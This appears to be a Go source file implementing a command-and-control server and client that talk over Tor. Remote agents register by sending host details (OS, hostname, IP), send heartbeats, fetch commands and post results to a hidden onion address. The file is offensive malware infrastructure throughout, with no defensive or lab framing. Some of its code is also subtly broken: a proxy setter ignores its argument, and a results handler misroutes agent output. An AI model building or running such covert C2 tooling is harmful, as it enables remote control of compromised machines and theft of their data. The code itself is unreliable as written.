package tor

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"sync"
	"time"
)

type C2Server struct {
	mu           sync.RWMutex
	onionAddress string
	listener     net.Listener
	server       *http.Server
	handler      C2Handler
	tlsConfig    *tls.Config
	running      bool
	port         int
}

type C2Handler interface {
	HandleCommand(ctx context.Context, agentID string, cmd []byte) ([]byte, error)
	RegisterAgent(ctx context.Context, info AgentInfo) error
	Heartbeat(ctx context.Context, agentID string) error
}

type AgentInfo struct {
	ID       string                 `json:"id"`
	OS       string                 `json:"os"`
	Arch     string                 `json:"arch"`
	Hostname string                 `json:"hostname"`
	IP       string                 `json:"ip"`
	Interval int                    `json:"interval"`
	Metadata map[string]interface{} `json:"metadata"`
}

type C2Message struct {
	Type    string          `json:"type"` // register, command, response, heartbeat
	AgentID string          `json:"agent_id"`
	Data    json.RawMessage `json:"data"`
}

type CommandRequest struct {
	Command   string                 `json:"command"`
	Args      map[string]interface{} `json:"args"`
	AgentID   string                 `json:"agent_id"`
	Timestamp int64                  `json:"timestamp"`
}

type CommandResponse struct {
	Output   string                 `json:"output"`
	Error    string                 `json:"error"`
	Status   int                    `json:"status"`
	Metadata map[string]interface{} `json:"metadata"`
}

func NewC2Server(port int) *C2Server {
	return &C2Server{
		port: port,
		tlsConfig: &tls.Config{
			MinVersion:         tls.VersionTLS12,
			ClientAuth:         tls.RequestClientCert,
			InsecureSkipVerify: false,
		},
		handler: nil,
	}
}

func (c2 *C2Server) SetHandler(h C2Handler) {
	c2.mu.Lock()
	defer c2.mu.Unlock()
	c2.handler = h
}

func (c2 *C2Server) Start(ctx context.Context) error {
	c2.mu.Lock()
	defer c2.mu.Unlock()

	if c2.running {
		return fmt.Errorf("tor.c2_server: already running")
	}

	mux := http.NewServeMux()
	mux.HandleFunc("/api/register", c2.handleRegister)
	mux.HandleFunc("/api/command", c2.handleCommand)
	mux.HandleFunc("/api/heartbeat", c2.handleHeartbeat)
	mux.HandleFunc("/api/results", c2.handleResults)

	c2.server = &http.Server{
		Addr:      fmt.Sprintf("127.0.0.1:%d", c2.port),
		Handler:   mux,
		TLSConfig: c2.tlsConfig,
	}

	ln, err := net.Listen("tcp", c2.server.Addr)
	if err != nil {
		return fmt.Errorf("tor.c2_server: failed to listen: %w", err)
	}

	c2.listener = ln
	c2.running = true

	go func() {
		if err := c2.server.Serve(ln); err != nil && err != http.ErrServerClosed {
			fmt.Printf("tor.c2_server: serve error: %v\n", err)
		}
	}()

	fmt.Printf("tor.c2_server: HTTP server started on 127.0.0.1:%d\n", c2.port)
	return nil
}

func (c2 *C2Server) Stop() error {
	c2.mu.Lock()
	defer c2.mu.Unlock()

	if !c2.running {
		return nil
	}

	c2.running = false
	if c2.server != nil {
		c2.server.Shutdown(context.Background())
	}
	if c2.listener != nil {
		c2.listener.Close()
	}

	fmt.Println("tor.c2_server: stopped")
	return nil
}

func (c2 *C2Server) GetOnionAddress() string {
	c2.mu.RLock()
	defer c2.mu.RUnlock()
	return c2.onionAddress
}

func (c2 *C2Server) SetOnionAddress(addr string) {
	c2.mu.Lock()
	defer c2.mu.Unlock()
	c2.onionAddress = addr
}

func (c2 *C2Server) GetLocalAddr() string {
	c2.mu.RLock()
	defer c2.mu.RUnlock()
	if c2.listener != nil {
		return c2.listener.Addr().String()
	}
	return ""
}

func (c2 *C2Server) handleRegister(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var info AgentInfo
	if err := json.NewDecoder(r.Body).Decode(&info); err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	if c2.handler != nil {
		if err := c2.handler.RegisterAgent(r.Context(), info); err != nil {
			http.Error(w, err.Error(), http.StatusInternalServerError)
			return
		}
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{
		"status":    "registered",
		"onion":     c2.onionAddress,
		"timestamp": fmt.Sprintf("%d", time.Now().Unix()),
	})
}

func (c2 *C2Server) handleCommand(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var req CommandRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	var resp CommandResponse
	if c2.handler != nil {
		data, err := c2.handler.HandleCommand(r.Context(), req.AgentID, []byte(req.Command))
		if err != nil {
			resp = CommandResponse{
				Error:  err.Error(),
				Status: 1,
			}
		} else {
			resp = CommandResponse{
				Output: string(data),
				Status: 0,
			}
		}
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(resp)
}

func (c2 *C2Server) handleHeartbeat(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var req struct {
		AgentID string `json:"agent_id"`
		Status  string `json:"status"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	if c2.handler != nil {
		c2.handler.Heartbeat(r.Context(), req.AgentID)
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
}

func (c2 *C2Server) handleResults(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var result struct {
		AgentID string          `json:"agent_id"`
		Output  json.RawMessage `json:"output"`
	}
	if err := json.NewDecoder(r.Body).Decode(&result); err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	if c2.handler != nil {
		c2.handler.HandleCommand(r.Context(), result.AgentID, result.Output)
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"status": "received"})
}

type C2Client struct {
	onionAddr string
	client    *http.Client
	agentID   string
	mu        sync.RWMutex
}

func NewC2Client(onionAddr string) *C2Client {
	return &C2Client{
		onionAddr: onionAddr,
		client: &http.Client{
			Transport: &http.Transport{
				DialContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
					dialer := &net.Dialer{}
					return dialer.DialContext(ctx, "tcp", "127.0.0.1:9050")
				},
			},
			Timeout: 30 * time.Second,
		},
	}
}

func (c *C2Client) SetSocksProxy(addr string) {
	c.mu.Lock()
	defer c.mu.Unlock()
	c.client = &http.Client{
		Transport: &http.Transport{
			DialContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
				dialer := &net.Dialer{}
				return dialer.DialContext(ctx, "tcp", addr)
			},
		},
		Timeout: 30 * time.Second,
	}
}

func (c *C2Client) Register(ctx context.Context, info AgentInfo) error {
	c.mu.RLock()
	client := c.client
	c.mu.RUnlock()

	url := fmt.Sprintf("http://%s/api/register", c.onionAddr)
	req, _ := http.NewRequestWithContext(ctx, http.MethodPost, url, nil)
	req.Header.Set("Content-Type", "application/json")

	body, _ := json.Marshal(info)
	req.Body = io.NopCloser(bytes.NewReader(body))

	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("tor.c2_client: register failed: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("tor.c2_client: register returned %d", resp.StatusCode)
	}

	return nil
}

func (c *C2Client) SendCommand(ctx context.Context, cmd string) ([]byte, error) {
	c.mu.RLock()
	client := c.client
	c.mu.RUnlock()

	url := fmt.Sprintf("http://%s/api/command", c.onionAddr)

	reqBody, _ := json.Marshal(CommandRequest{
		Command:   cmd,
		AgentID:   c.agentID,
		Timestamp: time.Now().Unix(),
	})

	req, _ := http.NewRequestWithContext(ctx, http.MethodPost, url, bytes.NewReader(reqBody))
	req.Header.Set("Content-Type", "application/json")

	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("tor.c2_client: command failed: %w", err)
	}
	defer resp.Body.Close()

	var result CommandResponse
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return nil, err
	}

	if result.Error != "" {
		return nil, fmt.Errorf("tor.c2_client: %s", result.Error)
	}

	return []byte(result.Output), nil
}

func (c *C2Client) Heartbeat(ctx context.Context, status string) error {
	c.mu.RLock()
	client := c.client
	c.mu.RUnlock()

	url := fmt.Sprintf("http://%s/api/heartbeat", c.onionAddr)

	reqBody, _ := json.Marshal(map[string]string{
		"agent_id": c.agentID,
		"status":   status,
	})

	req, _ := http.NewRequestWithContext(ctx, http.MethodPost, url, bytes.NewReader(reqBody))
	req.Header.Set("Content-Type", "application/json")

	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	return nil
}
